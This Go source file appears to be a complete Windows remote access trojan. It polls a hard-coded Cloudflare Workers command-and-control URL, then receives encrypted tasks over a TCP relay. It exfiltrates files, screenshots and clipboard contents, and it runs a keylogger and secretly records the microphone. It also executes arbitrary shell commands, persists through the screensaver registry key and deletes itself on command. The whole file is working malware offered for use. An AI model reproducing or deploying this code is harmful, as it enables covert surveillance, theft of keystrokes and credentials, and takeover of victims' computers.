package main

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	// Import your reorganized crypto package
	crypto "mrg2026/Crypto"

	"github.com/kbinani/screenshot"
	"golang.org/x/sys/windows/registry"
)

// --- CONFIGURATION ---
const OP_SECRET = "GHOST_KEY_ALPHA" //
const WORKER_URL = "https://flat-bird-157e.itay-a59.workers.dev/" //

var pendingAudioLoot string
var currentWorkingDir, _ = os.Getwd()
var (
	keyLogBuffer   strings.Builder
	user32         = syscall.NewLazyDLL("user32.dll")
	getAsyncState  = user32.NewProc("GetAsyncKeyState")
	openClipboard  = user32.NewProc("OpenClipboard")
	getClipboard   = user32.NewProc("GetClipboardData")
	closeClipboard = user32.NewProc("CloseClipboard")

	kernel32     = syscall.NewLazyDLL("kernel32.dll")
	globalLock   = kernel32.NewProc("GlobalLock")
	globalUnlock = kernel32.NewProc("GlobalUnlock")
)

type AuthRequest struct {
	Type     string `json:"type"`
	Key      string `json:"key"`
	TargetID string `json:"target_id"`
	Listen   string `json:"listen"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
}

type RoutingInfo struct {
	RelayAddr string `json:"relay_addr"`
}

func main() {
	// Recovery loop to ensure the ghost stays alive on minor errors
	defer func() {
		if r := recover(); r != nil {
			time.Sleep(5 * time.Second)
			main()
		}
	}()

	h, _ := os.Hostname()
	// Generate the anonymous Smart ID via your Crypto package
	smartID := crypto.GetSmartID(h)

	// Append privilege level for C2 UI visibility while staying anonymous
	if checkAdmin() {
		currExe, _ := os.Executable()
		if strings.Contains(strings.ToLower(currExe), "system32") {
			smartID += "-SYSTEM"
		} else {
			smartID += "-ADMIN"
		}
	}

	// Start keylogger as a background routine
	go startKeylogger()

	for {
		// Perform Stealth Polling via HTTPS Cloudflare Worker
		err := pollAndExecute(smartID)
		if err != nil {
			// Silent jitter on error to maintain stealth
			time.Sleep(15 * time.Second)
			continue
		}
		time.Sleep(10 * time.Second)
	}
}

// --- CORE STEALTH ENGINE ---

func pollAndExecute(targetID string) error {
	// 1. Prepare Poll Payload for the Worker
	auth := AuthRequest{
		Type:     "client_poll",
		TargetID: targetID,
		Key:      OP_SECRET,
		OS:       runtime.GOOS,
		Arch:     runtime.GOARCH,
	}
	jsonData, _ := json.Marshal(auth)

	// 2. HTTPS POST request to Cloudflare
	client := &http.Client{Timeout: 30 * time.Second}
	req, _ := http.NewRequest("POST", WORKER_URL, bytes.NewBuffer(jsonData))
	
	// Add the "Secret Knock" headers
	req.Header.Set("X-MRG-SECRET", OP_SECRET)
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// 3. Decode Command from Brain via Worker
	var r RoutingInfo
	if err := json.NewDecoder(resp.Body).Decode(&r); err != nil {
		return nil // No work assigned
	}

	// 4. Bridge Trigger: If Brain assigns a Relay, move to TCP for heavy data
	if r.RelayAddr != "" {
		return handleBridge(r.RelayAddr, targetID)
	}

	return nil
}

func handleBridge(relayAddr, targetID string) error {
	// Dial the high-speed TCP Relay for streaming tasks
	relayConn, err := net.DialTimeout("tcp", relayAddr, 5*time.Second)
	if err != nil {
		return err
	}
	defer relayConn.Close()

	// PSK Handshake with Relay
	_, err = relayConn.Write([]byte("8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"))
	if err != nil {
		return nil
	}

	// Session Key Handshake (Receive the 32-byte AES key)
	relayConn.SetReadDeadline(time.Now().Add(10 * time.Second))
	sessionKey := make([]byte, 32)
	if _, err = io.ReadFull(relayConn, sessionKey); err != nil {
		return nil
	}

	// Read Encrypted Task from Relay
	cmdEnc, err := bufio.NewReader(relayConn).ReadString('\n')
	if err != nil {
		return nil
	}

	// Decrypt via exported Crypto call
	rawCmd, err := crypto.DecryptPayload(strings.TrimSpace(cmdEnc), sessionKey)
	if err != nil {
		return nil
	}

	var finalOutput string

	// --- LOGIC GATEWAY (COMMAND PARSER) ---x
	if strings.HasPrefix(rawCmd, "download ") {
		filePath := strings.TrimPrefix(rawCmd, "download ")
		data, err := os.ReadFile(filePath)
		if err != nil {
			finalOutput = fmt.Sprintf("[!] FILE ERROR: %v", err)
		} else {
			finalOutput = "FILE_DATA:" + filepath.Base(filePath) + "|" + base64.StdEncoding.EncodeToString(data)
		}

	} else if rawCmd == "snap" {
		if screenshot.NumActiveDisplays() > 0 {
			bounds := screenshot.GetDisplayBounds(0)
			img, err := screenshot.CaptureRect(bounds)
			if err == nil {
				var buf bytes.Buffer
				png.Encode(&buf, img)
				finalOutput = "SNAP_DATA:" + base64.StdEncoding.EncodeToString(buf.Bytes())
			}
		}

	} else if rawCmd == "clip" {
		finalOutput = fmt.Sprintf("\n--- [CLIPBOARD] ---\n%s", getClipboardText())

	} else if rawCmd == "getkeys" {
		finalOutput = "\n--- [KEYLOG REPORT] ---\n" + keyLogBuffer.String()
		keyLogBuffer.Reset()

	} else if strings.HasPrefix(rawCmd, "listen ") {
		sec, _ := strconv.Atoi(strings.TrimPrefix(rawCmd, "listen "))
		go recordAudio(sec)
		finalOutput = fmt.Sprintf("[+] Mic active for %ds. Retrieve via 'checkaudio'.", sec)

	} else if rawCmd == "checkaudio" {
		if pendingAudioLoot != "" {
			finalOutput = pendingAudioLoot
			pendingAudioLoot = ""
		} else {
			finalOutput = "[!] Recording in progress or empty."
		}

	} else if strings.HasPrefix(rawCmd, "persist") {
		if err := setupPersistence(); err != nil {
			finalOutput = fmt.Sprintf("[!] Error: %v", err)
		} else {
			finalOutput = "[+] Screensaver Persistence Active."
		}

	} else if rawCmd == "self_destruct" {
		initiateSelfDestruct()
		return nil

	} else if rawCmd == "sysinfo" {
		finalOutput = fmt.Sprintf("\n[+] SMART_ID: %s\n[+] OS: %s %s\n[+] DIR: %s", targetID, runtime.GOOS, runtime.GOARCH, currentWorkingDir)

	} else {
		// Standard shell command execution
		cmdObj := exec.Command("cmd", "/C", rawCmd)
		cmdObj.Dir = currentWorkingDir
		out, _ := cmdObj.CombinedOutput()
		finalOutput = string(out)
	}

	// Encrypt final output and send back to Relay
	encRes, _ := crypto.EncryptPayload(finalOutput, sessionKey)
	fmt.Fprintf(relayConn, "%s\n", encRes)
	return nil
}

// --- SYSTEM UTILITIES ---

func checkAdmin() bool {
	f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	f.Close()
	return true
}

func getClipboardText() string {
	r, _, _ := openClipboard.Call(0)
	if r == 0 { return "[!] Locked" }
	defer closeClipboard.Call()
	h, _, _ := getClipboard.Call(1)
	if h == 0 { return "[!] Empty" }
	l, _, _ := globalLock.Call(h)
	defer globalUnlock.Call(h)
	return gostring(l)
}

func gostring(p uintptr) string {
	var s []byte
	for i := 0; ; i++ {
		b := *(*byte)(unsafe.Pointer(p + uintptr(i)))
		if b == 0 { break }
		s = append(s, b)
	}
	return string(s)
}

func recordAudio(sec int) {
	tempFile := filepath.Join(os.Getenv("TEMP"), "sys_cap.wav")
	winmm := syscall.NewLazyDLL("winmm.dll").NewProc("mciSendStringW")
	winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("open new type waveaudio alias ghostmic"))), 0, 0, 0)
	winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("record ghostmic"))), 0, 0, 0)
	time.Sleep(time.Duration(sec) * time.Second)
	winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("stop ghostmic"))), 0, 0, 0)
	winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(fmt.Sprintf(`save ghostmic "%s"`, tempFile)))), 0, 0, 0)
	winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("close ghostmic"))), 0, 0, 0)
	data, _ := os.ReadFile(tempFile)
	if len(data) > 0 {
		pendingAudioLoot = "FILE_DATA:mic_capture.wav|" + base64.StdEncoding.EncodeToString(data)
		os.Remove(tempFile)
	}
}

func setupPersistence() error {
	oldPath, err := os.Executable()
	if err != nil { return err }
	newPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes", "cached_theme.scr")
	input, _ := os.ReadFile(oldPath)
	os.WriteFile(newPath, input, 0644)
	k, _ := registry.OpenKey(registry.CURRENT_USER, `Control Panel\Desktop`, registry.ALL_ACCESS)
	defer k.Close()
	_ = k.SetStringValue("SCRNSAVE.EXE", newPath)
	_ = k.SetStringValue("ScreenSaveActive", "1")
	return nil
}

func initiateSelfDestruct() {
	selfPath, _ := os.Executable()
	// Detached command to delete binary after process exit
	cmd := fmt.Sprintf("timeout /t 5 & del /f /q \"%s\"", selfPath)
	exec.Command("cmd", "/C", cmd).Start()
	os.Exit(0)
}

func startKeylogger() {
	var lastKeyState [256]bool
	for {
		time.Sleep(10 * time.Millisecond)
		for i := 0; i < 256; i++ {
			ret, _, _ := getAsyncState.Call(uintptr(i))
			isPressed := (ret & 0x8000) != 0
			if isPressed && !lastKeyState[i] {
				if i >= 32 && i <= 126 {
					keyLogBuffer.WriteByte(byte(i))
				}
			}
			lastKeyState[i] = isPressed
		}
	}
}